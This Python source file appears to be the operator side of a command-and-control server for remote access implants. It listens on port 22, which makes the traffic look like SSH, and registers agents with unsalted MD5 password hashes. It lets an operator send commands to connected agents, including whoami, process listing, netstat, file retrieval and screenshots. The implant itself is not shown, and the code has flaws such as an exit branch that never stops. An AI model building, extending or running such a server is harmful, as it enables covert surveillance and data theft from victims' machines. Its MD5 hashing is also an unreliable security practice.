import socket
from threading import Thread
import sqlite3
import json
import hashlib
import time

connected_agents = {}
def send_message(sock_client, action):
    msg_bytes = json.dumps(action).encode()
    header = f"{len(msg_bytes):<10}".encode()
    sock_client.sendall(header + msg_bytes)

def handle_incoming(sock_client,agent_name):
    while True:
        msg = recv_message(sock_client)
        if not msg:
            break

        if msg.get("action") == "ping":
            agent_id = msg.get("agent_id")
            print(f"Received ping from agent: {agent_id}")

        else:
            command(sock_client,agent_name)

def get_agent_id(agent_name):
    conn = sqlite3.connect("db.sql")
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM agents WHERE agent_name = ?", (agent_name,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return row[0]  
    return None
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
def recv_message(sock):
    header = sock.recv(10).decode().strip()
    if not header:
        return None
    
    total_size = int(header)
    data = b""
    
    while len(data) < total_size:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk

    return json.loads(data.decode())
def init_db():
    db_file = 'db.sql' 
    schema_file = 'schema.sql'
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    try:
        with open(schema_file, 'r', encoding='utf-8') as f:
            sql_script = f.read()
        cursor.executescript(sql_script)
        conn.commit()
        print(f"[+] Database '{db_file}' initialized using '{schema_file}'")
    except FileNotFoundError:
        print(f"[x] Error: Please create a file named '{schema_file}' in the same folder!")
    except Exception as e:
        print(f"[x] Error: {e}")
    finally:
        conn.close()

def check_auth(name, password_raw):
    conn = sqlite3.connect('db.sql')
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT id, password_hash FROM agents WHERE agent_name = ?', (name,))
        result = cursor.fetchone()
        if result:
            agent_id, pw_hash = result
            if pw_hash == hash_password(password_raw):
                cursor.execute(
                    "UPDATE agents SET status=? WHERE id=?", ("ONLINE", agent_id)
                )
                conn.commit()
                return True
        return False
    finally:
        conn.close()

def add_agent_db(name, password, ip_address):
    hash_pw = hash_password(password)
    connection = sqlite3.connect("db.sql")
    cursor = connection.cursor()
    try:
        cursor.execute("""
            INSERT INTO agents (agent_name, password_hash, ip_address, status)
            VALUES (?, ?, ?, ?)""", (name, hash_pw, ip_address, 'ONLINE'))
        connection.commit()
        print(f"Successfully registered new agent: {name}")
        return True
    except sqlite3.IntegrityError:
        print(f"Error - agent {name} already exists")
        return False
    finally:
        connection.close()

def command(sock_client, agent_name):
    while True:
        print("enter agent id to send commands: example(agent 1)")
        agent_id = input().strip().lower()

        print("Choose a method: whoami, process list, netstat, get_files or scrennshot  exit to stop: ")
        method = input().strip().lower()
            
        if method == 'exit':
            print("Exiting command mode")
            
        command_client = {"action":method,"agent":agent_id}
        send_message(sock_client,command_client)        


        try:
            response = recv_message(sock_client)

            
            print(f"response from :{agent_id} : {response}")
            print(response["res"])
        except ValueError:
            print("[x] Error: Received invalid header format.")

        except Exception as e:
            print(f"[x] Unexpected error: {e}")


def handle_request(sock_client, agent_info, addr_client):
    auth = False
    try:
        data = agent_info.get("data", {}) 
        name = data.get("name")
        password = data.get("password")
        ip = addr_client[0] 
        action = agent_info.get("action")

        if action == 'login':
            if check_auth(name, password):
                agent_id=get_agent_id(name)
                if agent_id is not None:
                    response = {"status": "success", "agent_id": agent_id}
                    response_bytes = json.dumps(response).encode()
                    header = f"{len(response_bytes):<10}".encode()
                    sock_client.sendall(header+response_bytes)
                    auth = True
                else:
                    response = {"status": "failed", "agent_id": None}
                    response_bytes = json.dumps(response).encode()
                    header = f"{len(response_bytes):<10}".encode()
                    sock_client.send(header + response_bytes)

        elif action == 'create':
            if add_agent_db(name, password, ip):
                agent_id=get_agent_id(name)
                response = {"status": "success", "agent_id": agent_id}
                response_bytes = json.dumps(response).encode()
                header = f"{len(response_bytes):<10}".encode()
                sock_client.send(header + response_bytes)
                auth = True
            else:
                response = {"status": "failed", "agent_id": None}
                response_bytes = json.dumps(response).encode()
                header = f"{len(response_bytes):<10}".encode()
                sock_client.send(header + response_bytes)
        
        if auth:#start to command
            print("success in auth")
            connected_agents[name] = {'sock': sock_client, 'status': 'ONLINE'}
            Thread(target=command,args=(sock_client,name),daemon=True).start()
                
    except Exception as e:
        print(f"Error handling request: {e}")
 

if __name__ == '__main__':
    init_db() 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 22))
    sock.listen(5)
    print("The server is ready for agents")
    while True:
        sock_client, addr_client = sock.accept()
        print(f'New connection from {addr_client}')
        send_message(sock_client, {"action": "welcome", "msg": "Login or Create"})
        agent_info = recv_message(sock_client)
        Thread(target=handle_request, args=(sock_client, agent_info, addr_client), daemon=True).start()